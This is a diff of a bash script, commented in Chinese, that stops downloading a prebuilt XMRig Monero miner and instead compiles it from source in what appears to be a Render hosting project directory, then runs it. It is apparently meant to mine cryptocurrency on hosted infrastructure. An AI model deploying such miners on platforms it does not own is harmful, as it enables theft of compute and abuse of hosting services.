@@ -1,13 +1,29 @@
-#!/usr/bin/env bash
-set -e
+#!/bin/bash
 
-# 下載最新預編譯 XMRig 程式（Linux x64 靜態版）
-wget -q "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
-tar xf xmrig-6.24.0-linux-static-x64.tar.gz
-chmod +x xmrig
+# 進入儲存庫目錄
+cd /opt/render/project/src/002
 
-# 啟動挖礦
-./xmrig \
-  --config=config.json \
-  --threads=1 \
-  --cpu-priority=5
+# 更新套件清單
+sudo apt-get update
+
+# 安裝必要的依賴
+sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+# 下載 XMRig 源碼
+git clone https://github.com/xmrig/xmrig.git
+
+# 進入 XMRig 目錄
+cd xmrig
+
+# 創建並進入 build 目錄
+mkdir build && cd build
+
+# 生成 Makefile
+cmake ..
+
+# 編譯 XMRig
+make
+
+# 執行 XMRig
+./xmrig --config=config.json
+
